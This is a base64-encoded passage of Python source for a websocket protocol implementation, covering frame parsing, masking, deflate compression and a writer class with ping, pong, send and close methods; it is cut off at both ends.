CAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFdlYlNvY2tldEVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLklOVkFMSURfVEVYVCwgIkludmFsaWQgVVRGLTggdGV4dCBtZXNzYWdlIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKSBmcm9tIGV4Y1xyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucXVldWUuZmVlZF9kYXRhKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgV1NNZXNzYWdlKFdTTXNnVHlwZS5CSU5BUlksIHBheWxvYWRfbWVyZ2VkLCAiIiksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZW4ocGF5bG9hZF9tZXJnZWQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBGYWxzZSwgYiIiXHJcblxyXG4gICAgZGVmIHBhcnNlX2ZyYW1lKFxyXG4gICAgICAgIHNlbGYsIGJ1ZjogYnl0ZXNcclxuICAgICkgLT4gTGlzdFtUdXBsZVtib29sLCBPcHRpb25hbFtpbnRdLCBieXRlYXJyYXksIE9wdGlvbmFsW2Jvb2xdXV06XHJcbiAgICAgICAgIiIiUmV0dXJuIHRoZSBuZXh0IGZyYW1lIGZyb20gdGhlIHNvY2tldC4iIiJcclxuICAgICAgICBmcmFtZXMgPSBbXVxyXG4gICAgICAgIGlmIHNlbGYuX3RhaWw6XHJcbiAgICAgICAgICAgIGJ1Ziwgc2VsZi5fdGFpbCA9IHNlbGYuX3RhaWwgKyBidWYsIGIiIlxyXG5cclxuICAgICAgICBzdGFydF9wb3MgPSAwXHJcbiAgICAgICAgYnVmX2xlbmd0aCA9IGxlbihidWYpXHJcblxyXG4gICAgICAgIHdoaWxlIFRydWU6XHJcbiAgICAgICAgICAgICMgcmVhZCBoZWFkZXJcclxuICAgICAgICAgICAgaWYgc2VsZi5fc3RhdGUgPT0gV1NQYXJzZXJTdGF0ZS5SRUFEX0hFQURFUjpcclxuICAgICAgICAgICAgICAgIGlmIGJ1Zl9sZW5ndGggLSBzdGFydF9wb3MgPj0gMjpcclxuICAgICAgICAgICAgICAgICAgICBkYXRhID0gYnVmW3N0YXJ0X3BvcyA6IHN0YXJ0X3BvcyArIDJdXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhcnRfcG9zICs9IDJcclxuICAgICAgICAgICAgICAgICAgICBmaXJzdF9ieXRlLCBzZWNvbmRfYnl0ZSA9IGRhdGFcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgZmluID0gKGZpcnN0X2J5dGUgPj4gNykgJiAxXHJcbiAgICAgICAgICAgICAgICAgICAgcnN2MSA9IChmaXJzdF9ieXRlID4+IDYpICYgMVxyXG4gICAgICAgICAgICAgICAgICAgIHJzdjIgPSAoZmlyc3RfYnl0ZSA+PiA1KSAmIDFcclxuICAgICAgICAgICAgICAgICAgICByc3YzID0gKGZpcnN0X2J5dGUgPj4gNCkgJiAxXHJcbiAgICAgICAgICAgICAgICAgICAgb3Bjb2RlID0gZmlyc3RfYnl0ZSAmIDB4RlxyXG5cclxuICAgICAgICAgICAgICAgICAgICAjIGZyYW1lLWZpbiA9ICV4MCA7IG1vcmUgZnJhbWVzIG9mIHRoaXMgbWVzc2FnZSBmb2xsb3dcclxuICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAvICV4MSA7IGZpbmFsIGZyYW1lIG9mIHRoaXMgbWVzc2FnZVxyXG4gICAgICAgICAgICAgICAgICAgICMgZnJhbWUtcnN2MSA9ICV4MCA7XHJcbiAgICAgICAgICAgICAgICAgICAgIyAgICAxIGJpdCwgTVVTVCBiZSAwIHVubGVzcyBuZWdvdGlhdGVkIG90aGVyd2lzZVxyXG4gICAgICAgICAgICAgICAgICAgICMgZnJhbWUtcnN2MiA9ICV4MCA7XHJcbiAgICAgICAgICAgICAgICAgICAgIyAgICAxIGJpdCwgTVVTVCBiZSAwIHVubGVzcyBuZWdvdGlhdGVkIG90aGVyd2lzZVxyXG4gICAgICAgICAgICAgICAgICAgICMgZnJhbWUtcnN2MyA9ICV4MCA7XHJcbiAgICAgICAgICAgICAgICAgICAgIyAgICAxIGJpdCwgTVVTVCBiZSAwIHVubGVzcyBuZWdvdGlhdGVkIG90aGVyd2lzZVxyXG4gICAgICAgICAgICAgICAgICAgICNcclxuICAgICAgICAgICAgICAgICAgICAjIFJlbW92ZSByc3YxIGZyb20gdGhpcyB0ZXN0IGZvciBkZWZsYXRlIGRldmVsb3BtZW50XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcnN2MiBvciByc3YzIG9yIChyc3YxIGFuZCBub3Qgc2VsZi5fY29tcHJlc3MpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLlBST1RPQ09MX0VSUk9SLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlY2VpdmVkIGZyYW1lIHdpdGggbm9uLXplcm8gcmVzZXJ2ZWQgYml0cyIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgb3Bjb2RlID4gMHg3IGFuZCBmaW4gPT0gMDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgV2ViU29ja2V0RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXU0Nsb3NlQ29kZS5QUk9UT0NPTF9FUlJPUixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJSZWNlaXZlZCBmcmFnbWVudGVkIGNvbnRyb2wgZnJhbWUiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGhhc19tYXNrID0gKHNlY29uZF9ieXRlID4+IDcpICYgMVxyXG4gICAgICAgICAgICAgICAgICAgIGxlbmd0aCA9IHNlY29uZF9ieXRlICYgMHg3RlxyXG5cclxuICAgICAgICAgICAgICAgICAgICAjIENvbnRyb2wgZnJhbWVzIE1VU1QgaGF2ZSBhIHBheWxvYWRcclxuICAgICAgICAgICAgICAgICAgICAjIGxlbmd0aCBvZiAxMjUgYnl0ZXMgb3IgbGVzc1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIG9wY29kZSA+IDB4NyBhbmQgbGVuZ3RoID4gMTI1OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLlBST1RPQ09MX0VSUk9SLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIkNvbnRyb2wgZnJhbWUgcGF5bG9hZCBjYW5ub3QgYmUgIiAibGFyZ2VyIHRoYW4gMTI1IGJ5dGVzIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAjIFNldCBjb21wcmVzcyBzdGF0dXMgaWYgbGFzdCBwYWNrYWdlIGlzIEZJTlxyXG4gICAgICAgICAgICAgICAgICAgICMgT1Igc2V0IGNvbXByZXNzIHN0YXR1cyBpZiB0aGlzIGlzIGZpcnN0IGZyYWdtZW50XHJcbiAgICAgICAgICAgICAgICAgICAgIyBSYWlzZSBlcnJvciBpZiBub3QgZmlyc3QgZnJhZ21lbnQgd2l0aCByc3YxID0gMHgxXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5fZnJhbWVfZmluIG9yIHNlbGYuX2NvbXByZXNzZWQgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fY29tcHJlc3NlZCA9IFRydWUgaWYgcnN2MSBlbHNlIEZhbHNlXHJcbiAgICAgICAgICAgICAgICAgICAgZWxpZiByc3YxOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLlBST1RPQ09MX0VSUk9SLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlY2VpdmVkIGZyYW1lIHdpdGggbm9uLXplcm8gcmVzZXJ2ZWQgYml0cyIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZnJhbWVfZmluID0gYm9vbChmaW4pXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZnJhbWVfb3Bjb2RlID0gb3Bjb2RlXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5faGFzX21hc2sgPSBib29sKGhhc19tYXNrKVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfbGVuZ3RoX2ZsYWcgPSBsZW5ndGhcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9zdGF0ZSA9IFdTUGFyc2VyU3RhdGUuUkVBRF9QQVlMT0FEX0xFTkdUSFxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICAgICAgIyByZWFkIHBheWxvYWQgbGVuZ3RoXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3N0YXRlID09IFdTUGFyc2VyU3RhdGUuUkVBRF9QQVlMT0FEX0xFTkdUSDpcclxuICAgICAgICAgICAgICAgIGxlbmd0aCA9IHNlbGYuX3BheWxvYWRfbGVuZ3RoX2ZsYWdcclxuICAgICAgICAgICAgICAgIGlmIGxlbmd0aCA9PSAxMjY6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgYnVmX2xlbmd0aCAtIHN0YXJ0X3BvcyA+PSAyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gYnVmW3N0YXJ0X3BvcyA6IHN0YXJ0X3BvcyArIDJdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3BvcyArPSAyXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxlbmd0aCA9IFVOUEFDS19MRU4yKGRhdGEpWzBdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfbGVuZ3RoID0gbGVuZ3RoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3N0YXRlID0gKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgV1NQYXJzZXJTdGF0ZS5SRUFEX1BBWUxPQURfTUFTS1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5faGFzX21hc2tcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgV1NQYXJzZXJTdGF0ZS5SRUFEX1BBWUxPQURcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgICAgICBlbGlmIGxlbmd0aCA+IDEyNjpcclxuICAgICAgICAgICAgICAgICAgICBpZiBidWZfbGVuZ3RoIC0gc3RhcnRfcG9zID49IDg6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBidWZbc3RhcnRfcG9zIDogc3RhcnRfcG9zICsgOF1cclxuICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnRfcG9zICs9IDhcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoID0gVU5QQUNLX0xFTjMoZGF0YSlbMF1cclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGF5bG9hZF9sZW5ndGggPSBsZW5ndGhcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fc3RhdGUgPSAoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXU1BhcnNlclN0YXRlLlJFQURfUEFZTE9BRF9NQVNLXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLl9oYXNfbWFza1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBXU1BhcnNlclN0YXRlLlJFQURfUEFZTE9BRFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGF5bG9hZF9sZW5ndGggPSBsZW5ndGhcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9zdGF0ZSA9IChcclxuICAgICAgICAgICAgICAgICAgICAgICAgV1NQYXJzZXJTdGF0ZS5SRUFEX1BBWUxPQURfTUFTS1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLl9oYXNfbWFza1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbHNlIFdTUGFyc2VyU3RhdGUuUkVBRF9QQVlMT0FEXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgIyByZWFkIHBheWxvYWQgbWFza1xyXG4gICAgICAgICAgICBpZiBzZWxmLl9zdGF0ZSA9PSBXU1BhcnNlclN0YXRlLlJFQURfUEFZTE9BRF9NQVNLOlxyXG4gICAgICAgICAgICAgICAgaWYgYnVmX2xlbmd0aCAtIHN0YXJ0X3BvcyA+PSA0OlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2ZyYW1lX21hc2sgPSBidWZbc3RhcnRfcG9zIDogc3RhcnRfcG9zICsgNF1cclxuICAgICAgICAgICAgICAgICAgICBzdGFydF9wb3MgKz0gNFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3N0YXRlID0gV1NQYXJzZXJTdGF0ZS5SRUFEX1BBWUxPQURcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3N0YXRlID09IFdTUGFyc2VyU3RhdGUuUkVBRF9QQVlMT0FEOlxyXG4gICAgICAgICAgICAgICAgbGVuZ3RoID0gc2VsZi5fcGF5bG9hZF9sZW5ndGhcclxuICAgICAgICAgICAgICAgIHBheWxvYWQgPSBzZWxmLl9mcmFtZV9wYXlsb2FkXHJcblxyXG4gICAgICAgICAgICAgICAgY2h1bmtfbGVuID0gYnVmX2xlbmd0aCAtIHN0YXJ0X3Bvc1xyXG4gICAgICAgICAgICAgICAgaWYgbGVuZ3RoID49IGNodW5rX2xlbjpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9wYXlsb2FkX2xlbmd0aCA9IGxlbmd0aCAtIGNodW5rX2xlblxyXG4gICAgICAgICAgICAgICAgICAgIHBheWxvYWQuZXh0ZW5kKGJ1ZltzdGFydF9wb3M6XSlcclxuICAgICAgICAgICAgICAgICAgICBzdGFydF9wb3MgPSBidWZfbGVuZ3RoXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfbGVuZ3RoID0gMFxyXG4gICAgICAgICAgICAgICAgICAgIHBheWxvYWQuZXh0ZW5kKGJ1ZltzdGFydF9wb3MgOiBzdGFydF9wb3MgKyBsZW5ndGhdKVxyXG4gICAgICAgICAgICAgICAgICAgIHN0YXJ0X3BvcyA9IHN0YXJ0X3BvcyArIGxlbmd0aFxyXG5cclxuICAgICAgICAgICAgICAgIGlmIHNlbGYuX3BheWxvYWRfbGVuZ3RoID09IDA6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5faGFzX21hc2s6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzc2VydCBzZWxmLl9mcmFtZV9tYXNrIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIF93ZWJzb2NrZXRfbWFzayhzZWxmLl9mcmFtZV9tYXNrLCBwYXlsb2FkKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBmcmFtZXMuYXBwZW5kKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAoc2VsZi5fZnJhbWVfZmluLCBzZWxmLl9mcmFtZV9vcGNvZGUsIHBheWxvYWQsIHNlbGYuX2NvbXByZXNzZWQpXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9mcmFtZV9wYXlsb2FkID0gYnl0ZWFycmF5KClcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9zdGF0ZSA9IFdTUGFyc2VyU3RhdGUuUkVBRF9IRUFERVJcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuXHJcbiAgICAgICAgc2VsZi5fdGFpbCA9IGJ1ZltzdGFydF9wb3M6XVxyXG5cclxuICAgICAgICByZXR1cm4gZnJhbWVzXHJcblxyXG5cclxuY2xhc3MgV2ViU29ja2V0V3JpdGVyOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcHJvdG9jb2w6IEJhc2VQcm90b2NvbCxcclxuICAgICAgICB0cmFuc3BvcnQ6IGFzeW5jaW8uVHJhbnNwb3J0LFxyXG4gICAgICAgICosXHJcbiAgICAgICAgdXNlX21hc2s6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBsaW1pdDogaW50ID0gREVGQVVMVF9MSU1JVCxcclxuICAgICAgICByYW5kb206IEFueSA9IHJhbmRvbS5SYW5kb20oKSxcclxuICAgICAgICBjb21wcmVzczogaW50ID0gMCxcclxuICAgICAgICBub3Rha2VvdmVyOiBib29sID0gRmFsc2UsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5wcm90b2NvbCA9IHByb3RvY29sXHJcbiAgICAgICAgc2VsZi50cmFuc3BvcnQgPSB0cmFuc3BvcnRcclxuICAgICAgICBzZWxmLnVzZV9tYXNrID0gdXNlX21hc2tcclxuICAgICAgICBzZWxmLnJhbmRyYW5nZSA9IHJhbmRvbS5yYW5kcmFuZ2VcclxuICAgICAgICBzZWxmLmNvbXByZXNzID0gY29tcHJlc3NcclxuICAgICAgICBzZWxmLm5vdGFrZW92ZXIgPSBub3Rha2VvdmVyXHJcbiAgICAgICAgc2VsZi5fY2xvc2luZyA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fbGltaXQgPSBsaW1pdFxyXG4gICAgICAgIHNlbGYuX291dHB1dF9zaXplID0gMFxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzb2JqID0gTm9uZSAgIyB0eXBlOiBBbnkgICMgYWN0dWFsbHkgY29tcHJlc3NvYmpcclxuXHJcbiAgICBhc3luYyBkZWYgX3NlbmRfZnJhbWUoXHJcbiAgICAgICAgc2VsZiwgbWVzc2FnZTogYnl0ZXMsIG9wY29kZTogaW50LCBjb21wcmVzczogT3B0aW9uYWxbaW50XSA9IE5vbmVcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJTZW5kIGEgZnJhbWUgb3ZlciB0aGUgd2Vic29ja2V0IHdpdGggbWVzc2FnZSBhcyBpdHMgcGF5bG9hZC4iIiJcclxuICAgICAgICBpZiBzZWxmLl9jbG9zaW5nIGFuZCBub3QgKG9wY29kZSAmIFdTTXNnVHlwZS5DTE9TRSk6XHJcbiAgICAgICAgICAgIHJhaXNlIENvbm5lY3Rpb25SZXNldEVycm9yKCJDYW5ub3Qgd3JpdGUgdG8gY2xvc2luZyB0cmFuc3BvcnQiKVxyXG5cclxuICAgICAgICByc3YgPSAwXHJcblxyXG4gICAgICAgICMgT25seSBjb21wcmVzcyBsYXJnZXIgcGFja2V0cyAoZGlzYWJsZWQpXHJcbiAgICAgICAgIyBEb2VzIHNtYWxsIHBhY2tldCBuZWVkcyB0byBiZSBjb21wcmVzc2VkP1xyXG4gICAgICAgICMgaWYgc2VsZi5jb21wcmVzcyBhbmQgb3Bjb2RlIDwgOCBhbmQgbGVuKG1lc3NhZ2UpID4gMTI0OlxyXG4gICAgICAgIGlmIChjb21wcmVzcyBvciBzZWxmLmNvbXByZXNzKSBhbmQgb3Bjb2RlIDwgODpcclxuICAgICAgICAgICAgaWYgY29tcHJlc3M6XHJcbiAgICAgICAgICAgICAgICAjIERvIG5vdCBzZXQgc2VsZi5fY29tcHJlc3MgaWYgY29tcHJlc3NpbmcgaXMgZm9yIHRoaXMgZnJhbWVcclxuICAgICAgICAgICAgICAgIGNvbXByZXNzb2JqID0gemxpYi5jb21wcmVzc29iaihsZXZlbD16bGliLlpfQkVTVF9TUEVFRCwgd2JpdHM9LWNvbXByZXNzKVxyXG4gICAgICAgICAgICBlbHNlOiAgIyBzZWxmLmNvbXByZXNzXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5fY29tcHJlc3NvYmo6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fY29tcHJlc3NvYmogPSB6bGliLmNvbXByZXNzb2JqKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXZlbD16bGliLlpfQkVTVF9TUEVFRCwgd2JpdHM9LXNlbGYuY29tcHJlc3NcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBjb21wcmVzc29iaiA9IHNlbGYuX2NvbXByZXNzb2JqXHJcblxyXG4gICAgICAgICAgICBtZXNzYWdlID0gY29tcHJlc3NvYmouY29tcHJlc3MobWVzc2FnZSlcclxuICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2UgKyBjb21wcmVzc29iai5mbHVzaChcclxuICAgICAgICAgICAgICAgIHpsaWIuWl9GVUxMX0ZMVVNIIGlmIHNlbGYubm90YWtlb3ZlciBlbHNlIHpsaWIuWl9TWU5DX0ZMVVNIXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgaWYgbWVzc2FnZS5lbmRzd2l0aChfV1NfREVGTEFURV9UUkFJTElORyk6XHJcbiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZVs6LTRdXHJcbiAgICAgICAgICAgIHJzdiA9IHJzdiB8IDB4NDBcclxuXHJcbiAgICAgICAgbXNnX2xlbmd0aCA9IGxlbihtZXNzYWdlKVxyXG5cclxuICAgICAgICB1c2VfbWFzayA9IHNlbGYudXNlX21hc2tcclxuICAgICAgICBpZiB1c2VfbWFzazpcclxuICAgICAgICAgICAgbWFza19iaXQgPSAweDgwXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbWFza19iaXQgPSAwXHJcblxyXG4gICAgICAgIGlmIG1zZ19sZW5ndGggPCAxMjY6XHJcbiAgICAgICAgICAgIGhlYWRlciA9IFBBQ0tfTEVOMSgweDgwIHwgcnN2IHwgb3Bjb2RlLCBtc2dfbGVuZ3RoIHwgbWFza19iaXQpXHJcbiAgICAgICAgZWxpZiBtc2dfbGVuZ3RoIDwgKDEgPDwgMTYpOlxyXG4gICAgICAgICAgICBoZWFkZXIgPSBQQUNLX0xFTjIoMHg4MCB8IHJzdiB8IG9wY29kZSwgMTI2IHwgbWFza19iaXQsIG1zZ19sZW5ndGgpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaGVhZGVyID0gUEFDS19MRU4zKDB4ODAgfCByc3YgfCBvcGNvZGUsIDEyNyB8IG1hc2tfYml0LCBtc2dfbGVuZ3RoKVxyXG4gICAgICAgIGlmIHVzZV9tYXNrOlxyXG4gICAgICAgICAgICBtYXNrID0gc2VsZi5yYW5kcmFuZ2UoMCwgMHhGRkZGRkZGRilcclxuICAgICAgICAgICAgbWFzayA9IG1hc2sudG9fYnl0ZXMoNCwgImJpZyIpXHJcbiAgICAgICAgICAgIG1lc3NhZ2UgPSBieXRlYXJyYXkobWVzc2FnZSlcclxuICAgICAgICAgICAgX3dlYnNvY2tldF9tYXNrKG1hc2ssIG1lc3NhZ2UpXHJcbiAgICAgICAgICAgIHNlbGYuX3dyaXRlKGhlYWRlciArIG1hc2sgKyBtZXNzYWdlKVxyXG4gICAgICAgICAgICBzZWxmLl9vdXRwdXRfc2l6ZSArPSBsZW4oaGVhZGVyKSArIGxlbihtYXNrKSArIGxlbihtZXNzYWdlKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGlmIGxlbihtZXNzYWdlKSA+IE1TR19TSVpFOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fd3JpdGUoaGVhZGVyKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fd3JpdGUobWVzc2FnZSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3dyaXRlKGhlYWRlciArIG1lc3NhZ2UpXHJcblxyXG4gICAgICAgICAgICBzZWxmLl9vdXRwdXRfc2l6ZSArPSBsZW4oaGVhZGVyKSArIGxlbihtZXNzYWdlKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9vdXRwdXRfc2l6ZSA+IHNlbGYuX2xpbWl0OlxyXG4gICAgICAgICAgICBzZWxmLl9vdXRwdXRfc2l6ZSA9IDBcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5wcm90b2NvbC5fZHJhaW5faGVscGVyKClcclxuXHJcbiAgICBkZWYgX3dyaXRlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYudHJhbnNwb3J0IGlzIE5vbmUgb3Igc2VsZi50cmFuc3BvcnQuaXNfY2xvc2luZygpOlxyXG4gICAgICAgICAgICByYWlzZSBDb25uZWN0aW9uUmVzZXRFcnJvcigiQ2Fubm90IHdyaXRlIHRvIGNsb3NpbmcgdHJhbnNwb3J0IilcclxuICAgICAgICBzZWxmLnRyYW5zcG9ydC53cml0ZShkYXRhKVxyXG5cclxuICAgIGFzeW5jIGRlZiBwb25nKHNlbGYsIG1lc3NhZ2U6IGJ5dGVzID0gYiIiKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlNlbmQgcG9uZyBtZXNzYWdlLiIiIlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UobWVzc2FnZSwgc3RyKTpcclxuICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2UuZW5jb2RlKCJ1dGYtOCIpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fc2VuZF9mcmFtZShtZXNzYWdlLCBXU01zZ1R5cGUuUE9ORylcclxuXHJcbiAgICBhc3luYyBkZWYgcGluZyhzZWxmLCBtZXNzYWdlOiBieXRlcyA9IGIiIikgLT4gTm9uZTpcclxuICAgICAgICAiIiJTZW5kIHBpbmcgbWVzc2FnZS4iIiJcclxuICAgICAgICBpZiBpc2luc3RhbmNlKG1lc3NhZ2UsIHN0cik6XHJcbiAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlLmVuY29kZSgidXRmLTgiKVxyXG4gICAgICAgIGF3YWl0IHNlbGYuX3NlbmRfZnJhbWUobWVzc2FnZSwgV1NNc2dUeXBlLlBJTkcpXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtZXNzYWdlOiBVbmlvbltzdHIsIGJ5dGVzXSxcclxuICAgICAgICBiaW5hcnk6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBjb21wcmVzczogT3B0aW9uYWxbaW50XSA9IE5vbmUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiU2VuZCBhIGZyYW1lIG92ZXIgdGhlIHdlYnNvY2tldCB3aXRoIG1lc3NhZ2UgYXMgaXRzIHBheWxvYWQuIiIiXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShtZXNzYWdlLCBzdHIpOlxyXG4gICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZS5lbmNvZGUoInV0Zi04IilcclxuICAgICAgICBpZiBiaW5hcnk6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3NlbmRfZnJhbWUobWVzc2FnZSwgV1NNc2dUeXBlLkJJTkFSWSwgY29tcHJlc3MpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fc2VuZF9mcmFtZShtZXNzYWdlLCBXU01zZ1R5cGUuVEVYVCwgY29tcHJlc3MpXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYsIGNvZGU6IGludCA9IDEwMDAsIG1lc3NhZ2U6IGJ5dGVzID0gYiIiKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkNsb3NlIHRoZSB3ZWJzb2NrZXQsIHNlbmRpbmcgdGhlIHNwZWNpZmllZCBjb2RlIGFuZCBtZXNzYWdlLiIiIlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UobWVzc2FnZSwgc3RyKTpcclxuICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2UuZW5jb2RlKCJ1dGYtOCIpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9zZW5kX2ZyYW1lKFxyXG4gICAgICAgICAgICAgICAgUEFDS19DTE9TRV9DT0RFKG